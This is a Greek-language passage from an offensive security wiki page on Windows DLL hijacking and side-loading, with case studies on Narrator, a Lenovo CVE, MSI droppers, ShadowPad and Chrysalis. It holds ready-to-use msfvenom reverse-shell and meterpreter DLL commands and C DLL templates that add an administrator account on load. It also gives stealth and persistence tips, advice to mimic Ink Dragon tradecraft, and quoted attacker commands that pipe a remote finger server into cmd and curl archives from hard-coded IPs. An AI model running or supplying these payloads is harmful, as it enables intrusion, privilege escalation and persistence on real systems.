- Scheduled tasks που επανεκκινούν μετονομασμένα εκτελέσιμα ενημέρωσης από το **`%LOCALAPPDATA%`** ή από καταλόγους `\bin\update\` συγκεκριμένων εφαρμογών.
- Αλυσίδες γονικών/θυγατρικών διεργασιών όπου μια scheduled task εκκινεί ένα έμπιστο .NET host, το οποίο φορτώνει αμέσως assemblies που δεν προέρχονται από τον κατασκευαστή και βρίσκονται στον δικό του κατάλογο.

#### Εξαιρέσεις στη σειρά αναζήτησης DLL σύμφωνα με την τεκμηρίωση των Windows

Η τεκμηρίωση των Windows αναφέρει ορισμένες εξαιρέσεις στην τυπική σειρά αναζήτησης DLL:

- Όταν εντοπιστεί ένα **DLL με το ίδιο όνομα με ένα DLL που έχει ήδη φορτωθεί στη μνήμη**, το σύστημα παρακάμπτει τη συνήθη αναζήτηση. Αντί γι' αυτήν, ελέγχει αν υπάρχει ανακατεύθυνση και manifest και, αν δεν βρει κάτι, χρησιμοποιεί το DLL που βρίσκεται ήδη στη μνήμη. **Σε αυτό το σενάριο, το σύστημα δεν αναζητά το DLL**.
- Αν το DLL αναγνωριστεί ως **known DLL** για την τρέχουσα έκδοση των Windows, το σύστημα χρησιμοποιεί την έκδοσή του για το known DLL, μαζί με τυχόν εξαρτώμενα DLL, **παραλείποντας τη διαδικασία αναζήτησης**. Το κλειδί μητρώου **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** περιέχει μια λίστα με αυτά τα known DLL.
- Αν ένα **DLL έχει εξαρτήσεις**, η αναζήτηση αυτών των εξαρτώμενων DLL γίνεται σαν να είχαν δηλωθεί μόνο με τα **ονόματα των modules** τους, ανεξάρτητα από το αν το αρχικό DLL εντοπίστηκε μέσω πλήρους διαδρομής.

### Κλιμάκωση προνομίων

**Απαιτήσεις**:

- Εντοπίστε μια διεργασία που εκτελείται ή πρόκειται να εκτελεστεί με **διαφορετικά προνόμια** (οριζόντια ή πλευρική μετακίνηση) και **δεν διαθέτει ένα DLL**.
- Βεβαιωθείτε ότι έχετε **δικαίωμα εγγραφής** σε οποιονδήποτε **κατάλογο** στον οποίο θα γίνει **αναζήτηση του DLL**. Αυτή η τοποθεσία μπορεί να είναι ο κατάλογος του εκτελέσιμου αρχείου ή ένας κατάλογος μέσα στη διαδρομή συστήματος.

Αυτές οι προϋποθέσεις συνήθως δεν υπάρχουν εξ ορισμού: τα προνομιούχα εκτελέσιμα δεν έχουν κατά κανόνα ελλείπουσες εξαρτήσεις DLL, ενώ οι τυπικοί χρήστες συνήθως δεν μπορούν να γράψουν σε καταλόγους της διαδρομής αναζήτησης συστήματος. Ωστόσο, λανθασμένα ρυθμισμένα περιβάλλοντα μπορεί να εκθέσουν και τις δύο συνθήκες.\
Αν πληρούνται οι απαιτήσεις, ελέγξτε το έργο [UACME](https://github.com/hfiref0x/UACME). Αν και ο κύριος στόχος του είναι το UAC bypass, περιλαμβάνει PoCs για DLL hijacking σε συγκεκριμένες εκδόσεις των Windows, τα οποία συχνά μπορούν να προσαρμοστούν στον εγγράψιμο κατάλογο που εντοπίσατε.

Σημειώστε ότι μπορείτε να **ελέγξετε τα δικαιώματά σας σε έναν φάκελο** ως εξής:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Και **ελέγξτε τα δικαιώματα όλων των φακέλων μέσα στο PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Μπορείτε επίσης να ελέγξετε τα imports ενός εκτελέσιμου και τα exports ενός DLL με:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Για έναν πλήρη οδηγό σχετικά με το πώς να κάνετε **abuse το DLL Hijacking για privilege escalation** έχοντας δικαιώματα εγγραφής σε έναν φάκελο **System Path**, δείτε:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Αυτοματοποιημένα εργαλεία

Το [**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) θα ελέγξει αν έχετε δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στο system PATH.\
Άλλα ενδιαφέροντα αυτοματοποιημένα εργαλεία για τον εντοπισμό αυτής της ευπάθειας είναι οι **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ και _Write-HijackDll._

### Παράδειγμα

Αν εντοπίσετε ένα exploitable σενάριο, ένα από τα σημαντικότερα πράγματα για να το εκμεταλλευτείτε επιτυχώς είναι να **δημιουργήσετε ένα dll που εξάγει τουλάχιστον όλες τις functions που θα κάνει import το executable**. Σε κάθε περίπτωση, σημειώστε ότι το DLL Hijacking είναι χρήσιμο για privilege escalation από επίπεδο Medium Integrity σε High **(παρακάμπτοντας το UAC)** ή από **High Integrity σε SYSTEM**. Μπορείτε να βρείτε ένα παράδειγμα για το **πώς να δημιουργήσετε ένα έγκυρο dll** σε αυτήν τη μελέτη για το DLL hijacking, η οποία εστιάζει στο DLL hijacking για εκτέλεση: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Επιπλέον, στην **επόμενη ενότητα** μπορείτε να βρείτε μερικούς **βασικούς κώδικες dll** που μπορεί να σας φανούν χρήσιμοι ως **templates** ή για να δημιουργήσετε ένα **dll με exported functions που δεν απαιτούνται**.

## **Δημιουργία και μεταγλώττιση DLLs**

### **DLL Proxifying**

Βασικά, ένα **DLL proxy** είναι ένα DLL που μπορεί να **εκτελεί τον κακόβουλο κώδικά σας όταν φορτώνεται**, αλλά και να **εκθέτει** και να **λειτουργεί** όπως **αναμένεται**, προωθώντας όλες τις κλήσεις στην πραγματική library.

Με το εργαλείο [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ή το [**Spartacus**](https://github.com/Accenture/Spartacus) μπορείτε να **ορίσετε ένα executable και να επιλέξετε τη library** που θέλετε να proxify και να **δημιουργήσετε ένα proxified dll**, ή να **ορίσετε το DLL** και να **δημιουργήσετε ένα proxified dll**.

### **Meterpreter**

**Λήψη rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Αποκτήστε ένα meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Δημιουργία χρήστη (x86, δεν είδα έκδοση x64):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Το δικό σας

Σε πολλές περιπτώσεις, το DLL που μεταγλωττίζετε πρέπει να **εξάγει κάθε συνάρτηση που εισάγει η διεργασία-θύμα**. Αν λείπει κάποια απαιτούμενη εξαγωγή, το binary δεν μπορεί να επιλύσει τη συνάρτηση και το exploit αποτυγχάνει.

<details>
<summary>Πρότυπο DLL σε C (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Παράδειγμα C++ DLL με δημιουργία χρήστη</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Εναλλακτικό DLL σε C με σημείο εισόδου thread</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Μελέτη περίπτωσης: Hijack του Localization DLL του Narrator OneCore TTS (Accessibility/ATs)

Το Windows Narrator.exe εξακολουθεί κατά την εκκίνηση να αναζητά ένα προβλέψιμο, ειδικό για τη γλώσσα localization DLL, το οποίο μπορεί να γίνει hijack για αυθαίρετη εκτέλεση κώδικα και persistence.<sup>[[7]](#references)</sup>

Βασικά στοιχεία
- Διαδρομή αναζήτησης (τρέχουσες εκδόσεις): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Παλαιότερη διαδρομή (παλαιότερες εκδόσεις): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Αν υπάρχει ένα εγγράψιμο DLL ελεγχόμενο από τον επιτιθέμενο στη διαδρομή OneCore, φορτώνεται και εκτελείται το `DllMain(DLL_PROCESS_ATTACH)`. Δεν απαιτούνται exports.

Εντοπισμός με Procmon
- Φίλτρο: `Process Name is Narrator.exe` και `Operation is Load Image` ή `CreateFile`.
- Εκκινήστε το Narrator και παρατηρήστε την προσπάθεια φόρτωσης από την παραπάνω διαδρομή.

Ελάχιστο DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

Σιωπή OPSEC
- Ένα αφελές hijack θα προκαλέσει ομιλία/θα επισημάνει στοιχεία του UI. Για να παραμείνετε αθόρυβοι, κατά την προσάρτηση απαριθμήστε τα νήματα του Narrator, ανοίξτε το κύριο νήμα (`OpenThread(THREAD_SUSPEND_RESUME)`) και εκτελέστε `SuspendThread` σε αυτό· συνεχίστε στο δικό σας νήμα. Δείτε το PoC για τον πλήρη κώδικα.<sup>[[8]](#references)</sup>

Ενεργοποίηση και persistence μέσω ρυθμίσεων Accessibility
- Πλαίσιο χρήστη (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Με τις παραπάνω ρυθμίσεις, η εκκίνηση του Narrator φορτώνει το τοποθετημένο DLL. Στην ασφαλή επιφάνεια εργασίας (οθόνη σύνδεσης), πατήστε CTRL+WIN+ENTER για να εκκινήσετε το Narrator· το DLL σας εκτελείται ως SYSTEM στην ασφαλή επιφάνεια εργασίας.

Εκτέλεση SYSTEM που ενεργοποιείται μέσω RDP (πλευρική μετακίνηση)
- Ενεργοποιήστε το κλασικό επίπεδο ασφαλείας RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Συνδεθείτε στον host μέσω RDP και, στην οθόνη σύνδεσης, πατήστε CTRL+WIN+ENTER για να εκκινήσετε το Narrator· το DLL σας εκτελείται ως SYSTEM στην ασφαλή επιφάνεια εργασίας.
- Η εκτέλεση σταματά όταν κλείσει η συνεδρία RDP — κάντε inject/migrate άμεσα.

Bring Your Own Accessibility (BYOA)
- Μπορείτε να κλωνοποιήσετε μια ενσωματωμένη εγγραφή μητρώου Accessibility Tool (AT) (π.χ. CursorIndicator), να την επεξεργαστείτε ώστε να δείχνει σε αυθαίρετο binary/DLL, να την εισαγάγετε και, στη συνέχεια, να ορίσετε το `configuration` στο όνομα αυτού του AT. Με αυτόν τον τρόπο, αυθαίρετη εκτέλεση γίνεται proxy μέσω του framework Accessibility.

Σημειώσεις
- Η εγγραφή στο `%windir%\System32` και η αλλαγή τιμών HKLM απαιτούν δικαιώματα διαχειριστή.
- Όλη η λογική του payload μπορεί να βρίσκεται στο `DLL_PROCESS_ATTACH`· δεν χρειάζονται exports.

## Μελέτη περίπτωσης: CVE-2025-1729 - Κλιμάκωση δικαιωμάτων μέσω του TPQMAssistant.exe

Αυτή η περίπτωση παρουσιάζει **Phantom DLL Hijacking** στο TrackPoint Quick Menu της Lenovo (`TPQMAssistant.exe`), με αναγνωριστικό **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Λεπτομέρειες ευπάθειας

- **Στοιχείο**: Το `TPQMAssistant.exe` βρίσκεται στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Προγραμματισμένη εργασία**: Η `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` εκτελείται καθημερινά στις 9:30 π.μ. στο πλαίσιο του συνδεδεμένου χρήστη.
- **Δικαιώματα καταλόγου**: Εγγράψιμος από τον `CREATOR OWNER`, επιτρέποντας στους τοπικούς χρήστες να τοποθετούν αυθαίρετα αρχεία.
- **Συμπεριφορά αναζήτησης DLL**: Προσπαθεί πρώτα να φορτώσει το `hostfxr.dll` από τον κατάλογο εργασίας του και καταγράφει "NAME NOT FOUND" αν λείπει, υποδεικνύοντας ότι προηγείται η αναζήτηση στον τοπικό κατάλογο.

### Υλοποίηση exploit

Ένας εισβολέας μπορεί να τοποθετήσει ένα κακόβουλο stub `hostfxr.dll` στον ίδιο κατάλογο και να εκμεταλλευτεί την απουσία του DLL για να επιτύχει εκτέλεση κώδικα στο πλαίσιο του χρήστη:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Ροή επίθεσης

1. Ως τυπικός χρήστης, τοποθετήστε το `hostfxr.dll` στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Περιμένετε να εκτελεστεί η προγραμματισμένη εργασία στις 9:30 π.μ. στο πλαίσιο του τρέχοντος χρήστη.
3. Αν ένας διαχειριστής είναι συνδεδεμένος κατά την εκτέλεση της εργασίας, το κακόβουλο DLL εκτελείται στη συνεδρία του διαχειριστή με μεσαίο επίπεδο ακεραιότητας.
4. Συνδυάστε τυπικές τεχνικές παράκαμψης UAC για να κλιμακώσετε τα δικαιώματα από μεσαίο επίπεδο ακεραιότητας σε προνόμια SYSTEM.

## Μελέτη περίπτωσης: Dropper MSI CustomAction + DLL Side-Loading μέσω υπογεγραμμένου Host (wsc_proxy.exe)

Οι φορείς απειλών συχνά συνδυάζουν droppers βασισμένα σε MSI με DLL side-loading, ώστε να εκτελούν payloads μέσω μιας έμπιστης, υπογεγραμμένης διεργασίας.<sup>[[10]](#references)</sup>

Επισκόπηση αλυσίδας
- Ο χρήστης κατεβάζει ένα MSI. Ένα CustomAction εκτελείται σιωπηλά κατά την εγκατάσταση με GUI (π.χ. LaunchApplication ή μια ενέργεια VBScript) και ανασυνθέτει το επόμενο στάδιο από ενσωματωμένους πόρους.
- Το dropper γράφει ένα νόμιμο, υπογεγραμμένο EXE και ένα κακόβουλο DLL στον ίδιο κατάλογο (παράδειγμα ζεύγους: wsc_proxy.exe υπογεγραμμένο από την Avast + wsc.dll ελεγχόμενο από τον εισβολέα).
- Όταν ξεκινήσει το υπογεγραμμένο EXE, η σειρά αναζήτησης DLL των Windows φορτώνει πρώτα το wsc.dll από τον κατάλογο εργασίας, εκτελώντας κώδικα του εισβολέα κάτω από υπογεγραμμένη γονική διεργασία (ATT&CK T1574.001).

Ανάλυση MSI (τι να αναζητήσετε)
- Πίνακας CustomAction:
  - Αναζητήστε εγγραφές που εκτελούν εκτελέσιμα αρχεία ή VBScript. Παράδειγμα ύποπτου μοτίβου: το LaunchApplication εκτελεί ένα ενσωματωμένο αρχείο στο παρασκήνιο.
  - Στο Orca (Microsoft Orca.exe), εξετάστε τους πίνακες CustomAction, InstallExecuteSequence και Binary.
- Ενσωματωμένα/διαχωρισμένα payloads στο CAB του MSI:
  - Διοικητική εξαγωγή: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Ή χρησιμοποιήστε το lessmsi: lessmsi x package.msi C:\out
  - Αναζητήστε πολλά μικρά τμήματα που συνενώνονται και αποκρυπτογραφούνται από ένα VBScript CustomAction. Συνήθης ροή:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Πρακτικό sideloading με το wsc_proxy.exe
- Τοποθετήστε αυτά τα δύο αρχεία στον ίδιο φάκελο:
  - wsc_proxy.exe: νόμιμο, υπογεγραμμένο host (Avast). Η διεργασία επιχειρεί να φορτώσει το wsc.dll με βάση το όνομά του από τον κατάλογό της.
  - wsc.dll: DLL του επιτιθέμενου. Αν δεν απαιτούνται συγκεκριμένα exports, αρκεί το DllMain· διαφορετικά, δημιουργήστε ένα proxy DLL και προωθήστε τα απαιτούμενα exports στην αυθεντική βιβλιοθήκη, εκτελώντας παράλληλα το payload στο DllMain.
- Δημιουργήστε ένα ελάχιστο DLL payload:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Για απαιτήσεις export, χρησιμοποιήστε ένα proxying framework (π.χ. DLLirant/Spartacus) για να δημιουργήσετε ένα forwarding DLL που εκτελεί επίσης το payload σας.

- Αυτή η τεχνική βασίζεται στην επίλυση ονομάτων DLL από το host binary. Αν το host χρησιμοποιεί απόλυτες διαδρομές ή safe loading flags (π.χ. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), το hijack μπορεί να αποτύχει.
- Τα KnownDLLs, SxS και τα forwarded exports μπορούν να επηρεάσουν την προτεραιότητα και πρέπει να λαμβάνονται υπόψη κατά την επιλογή του host binary και του συνόλου των exports.

## Υπογεγραμμένες τριάδες + κρυπτογραφημένα payloads (μελέτη περίπτωσης ShadowPad)

Η Check Point περιέγραψε πώς το Ink Dragon αναπτύσσει το ShadowPad χρησιμοποιώντας μια **τριάδα τριών αρχείων**, ώστε να ενσωματώνεται σε νόμιμο λογισμικό, διατηρώντας παράλληλα το βασικό payload κρυπτογραφημένο στον δίσκο:<sup>[[12]](#references)</sup>

1. **Υπογεγραμμένο host EXE** – γίνεται κατάχρηση προμηθευτών όπως οι AMD, Realtek ή NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Οι επιτιθέμενοι μετονομάζουν το εκτελέσιμο ώστε να μοιάζει με Windows binary (για παράδειγμα, `conhost.exe`), αλλά η υπογραφή Authenticode παραμένει έγκυρη.
2. **Κακόβουλο loader DLL** – τοποθετείται δίπλα στο EXE με αναμενόμενο όνομα (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Το DLL είναι συνήθως MFC binary, obfuscated με το framework ScatterBrain· μοναδικός σκοπός του είναι να εντοπίσει το κρυπτογραφημένο blob, να το αποκρυπτογραφήσει και να κάνει reflective mapping του ShadowPad.
3. **Κρυπτογραφημένο payload blob** – συχνά αποθηκεύεται ως `<name>.tmp` στον ίδιο φάκελο. Αφού κάνει memory-mapping το αποκρυπτογραφημένο payload, ο loader διαγράφει το αρχείο TMP για να καταστρέψει τα forensic evidence.

Σημειώσεις tradecraft:

* Η μετονομασία του υπογεγραμμένου EXE (ενώ διατηρείται το αρχικό `OriginalFileName` στην PE header) του επιτρέπει να μεταμφιέζεται σε Windows binary, διατηρώντας παράλληλα την υπογραφή του προμηθευτή. Επομένως, αναπαράγετε τη συνήθεια του Ink Dragon να τοποθετεί binaries που μοιάζουν με `conhost.exe`, αλλά είναι στην πραγματικότητα βοηθητικά προγράμματα AMD/NVIDIA.
* Επειδή το εκτελέσιμο παραμένει έμπιστο, τα περισσότερα allowlisting controls απαιτούν μόνο να βρίσκεται το κακόβουλο DLL δίπλα του. Εστιάστε στην προσαρμογή του loader DLL· το υπογεγραμμένο parent συνήθως μπορεί να εκτελεστεί χωρίς τροποποιήσεις.
* Ο decryptor του ShadowPad απαιτεί το TMP blob να βρίσκεται δίπλα στον loader και ο φάκελος να είναι εγγράψιμος, ώστε να μπορεί να μηδενίσει το αρχείο μετά το mapping. Διατηρήστε τον φάκελο εγγράψιμο μέχρι να φορτωθεί το payload· όταν πλέον βρίσκεται στη μνήμη, το αρχείο TMP μπορεί να διαγραφεί με ασφάλεια για OPSEC.

### Αλυσίδα LOLBAS stager + sideloading staged archive (finger → tar/curl → WMI)

Οι operators συνδυάζουν το DLL sideloading με LOLBAS, ώστε το μοναδικό custom artifact στον δίσκο να είναι το κακόβουλο DLL δίπλα στο έμπιστο EXE:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Κρυφό PowerShell εκκινεί το `cmd.exe /c`, λαμβάνει εντολές από έναν Finger server και τις προωθεί στο `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - Το `finger user@host` λαμβάνει κείμενο μέσω TCP/79· το `| cmd` εκτελεί την απόκριση του server, επιτρέποντας στους operators να αλλάζουν το second stage από την πλευρά του server.

- **Ενσωματωμένη λήψη/αποσυμπίεση:** Κατεβάστε ένα archive με αβλαβή επέκταση, αποσυμπιέστε το και τοποθετήστε τον στόχο sideload μαζί με το DLL σε έναν τυχαίο φάκελο `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - Το `curl -s -L` αποκρύπτει την πρόοδο και ακολουθεί τις ανακατευθύνσεις· το `tar -xf` χρησιμοποιεί το ενσωματωμένο στα Windows tar.

- **Εκκίνηση μέσω WMI/CIM:** Εκκινήστε το EXE μέσω WMI, ώστε η τηλεμετρία να εμφανίζει μια διεργασία που δημιουργήθηκε μέσω CIM, ενώ φορτώνει το DLL που βρίσκεται στον ίδιο κατάλογο:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Λειτουργεί με binaries που προτιμούν τοπικά DLLs (π.χ., `intelbq.exe`, `nearby_share.exe`)· το payload (π.χ., Remcos) εκτελείται με το έμπιστο όνομα.

- **Hunting:** Δημιουργήστε alert για το `forfiles` όταν εμφανίζονται μαζί τα `/p`, `/m` και `/c`· αυτό είναι ασυνήθιστο εκτός από admin scripts.


## Μελέτη περίπτωσης: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Μια πρόσφατη εισβολή του Lotus Blossom εκμεταλλεύτηκε μια έμπιστη αλυσίδα ενημερώσεων για να παραδώσει ένα NSIS-packed dropper που εγκαθιστούσε ένα DLL sideload μαζί με payloads που εκτελούνταν εξ ολοκλήρου στη μνήμη.<sup>[[13]](#references)</sup>

Ροή tradecraft
- Το `update.exe` (NSIS) δημιουργεί το `%AppData%\Bluetooth`, το επισημαίνει ως **HIDDEN**, τοποθετεί ένα μετονομασμένο Bitdefender Submission Wizard `BluetoothService.exe`, ένα κακόβουλο `log.dll` και ένα κρυπτογραφημένο blob `BluetoothService` και, στη συνέχεια, εκκινεί το EXE.
- Το host EXE εισάγει το `log.dll` και καλεί τα `LogInit`/`LogWrite`. Η `LogInit` φορτώνει το blob μέσω mmap· η `LogWrite` το αποκρυπτογραφεί με ένα custom stream βασισμένο σε LCG (σταθερές **0x19660D** / **0x3C6EF35F**, με key material που προκύπτει από προηγούμενο hash), αντικαθιστά το περιεχόμενο του buffer με plaintext shellcode, αποδεσμεύει τα προσωρινά δεδομένα και μεταφέρει την εκτέλεση σε αυτό.
- Για να αποφύγει το IAT, ο loader επιλύει APIs κατακερματίζοντας τα export names με **FNV-1a basis 0x811C9DC5 + prime 0x1000193** και, στη συνέχεια, εφαρμόζοντας ένα Murmur-style avalanche (**0x85EBCA6B**) και συγκρίνοντας τα αποτελέσματα με salted target hashes.

Κύριο shellcode (Chrysalis)
- Αποκρυπτογραφεί ένα κύριο module τύπου PE επαναλαμβάνοντας add/XOR/sub με το key `gQ2JR&9;` σε πέντε περάσματα και, στη συνέχεια, φορτώνει δυναμικά το `Kernel32.dll` → `GetProcAddress` για να ολοκληρώσει την επίλυση των imports.
- Ανακατασκευάζει strings ονομάτων DLL κατά τον χρόνο εκτέλεσης μέσω bit-rotate/XOR transforms ανά χαρακτήρα και, στη συνέχεια, φορτώνει τα `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Χρησιμοποιεί έναν δεύτερο resolver που διατρέχει το **PEB → InMemoryOrderModuleList**, αναλύει κάθε export table σε blocks των 4 byte με Murmur-style mixing και χρησιμοποιεί το `GetProcAddress` μόνο αν δεν βρεθεί το hash.

Ενσωματωμένο configuration & C2
- Το config βρίσκεται μέσα στο αρχείο `BluetoothService` που τοποθετήθηκε, στη **θέση 0x30808** (μέγεθος **0x980**) και αποκρυπτογραφείται με RC4 χρησιμοποιώντας το key `qwhvb^435h&*7`, αποκαλύπτοντας το C2 URL και το User-Agent.
- Τα beacons δημιουργούν ένα dot-delimited host profile, προσθέτουν μπροστά το tag `4Q` και, στη συνέχεια, το κρυπτογραφούν με RC4 χρησιμοποιώντας το key `vAuig34%^325hGV` πριν από το `HttpSendRequestA` μέσω HTTPS. Οι απαντήσεις αποκρυπτογραφούνται με RC4 και δρομολογούνται μέσω ενός tag switch (`4T` shell, `4V` εκτέλεση διεργασίας, `4W/4X` εγγραφή αρχείου, `4Y` ανάγνωση/exfil, `4\\` απεγκατάσταση, `4` απαρίθμηση drive/file + περιπτώσεις chunked transfer).
- Ο τρόπος εκτέλεσης καθορίζεται από τα CLI args: χωρίς args = εγκατάσταση persistence (service/Run key) που δείχνει στο `-i`· το `-i` επανεκκινεί το ίδιο με `-k`· το `-k` παραλείπει την εγκατάσταση και εκτελεί το payload.

Παρατηρήθηκε εναλλακτικός loader
- Η ίδια εισβολή τοποθέτησε το Tiny C Compiler και εκτέλεσε το `svchost.exe -nostdlib -run conf.c` από το `C:\ProgramData\USOShared\`, με το `libtcc.dll` δίπλα του. Ο C source κώδικας που παρείχε ο attacker ενσωμάτωνε shellcode, μεταγλωττιζόταν και εκτελούνταν στη μνήμη χωρίς να εγγραφεί PE στον δίσκο. Αναπαραγάγετε με:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Αυτό το στάδιο μεταγλώττισης και εκτέλεσης που βασίζεται σε TCC εισήγαγε το `Wininet.dll` κατά τον χρόνο εκτέλεσης και κατέβασε ένα shellcode δεύτερου σταδίου από ένα hardcoded URL, παρέχοντας έναν ευέλικτο loader που μεταμφιέζεται σε εκτέλεση compiler.

## Φόρτωση μέσω sideloading σε υπογεγραμμένο host με proxying εξαγωγών + αδρανοποίηση νήματος host

Ορισμένες αλυσίδες DLL sideloading προσθέτουν **τεχνικές σταθεροποίησης**, ώστε ο νόμιμος host να παραμένει ενεργός για αρκετό χρόνο ώστε να φορτώσει σωστά τα επόμενα στάδια, αντί να καταρρεύσει μετά τη φόρτωση της κακόβουλης DLL.<sup>[[11]](#references)</sup>

Παρατηρημένο μοτίβο
- Τοποθέτησε ένα έμπιστο EXE δίπλα σε μια κακόβουλη DLL με το αναμενόμενο όνομα εξάρτησης, όπως `version.dll`.
- Η κακόβουλη DLL **προωθεί κάθε αναμενόμενη εξαγωγή** στην πραγματική DLL συστήματος (για παράδειγμα, `%SystemRoot%\\System32\\version.dll`), ώστε η επίλυση εισαγωγών να συνεχίσει να πετυχαίνει και η διεργασία host να εξακολουθήσει να λειτουργεί.
- Μετά τη φόρτωση, η κακόβουλη DLL **τροποποιεί το σημείο εισόδου του host**, ώστε το κύριο νήμα να εισέλθει σε έναν ατέρμονο βρόχο `Sleep` αντί να τερματιστεί ή να εκτελέσει διαδρομές κώδικα που θα τερμάτιζαν τη διεργασία.
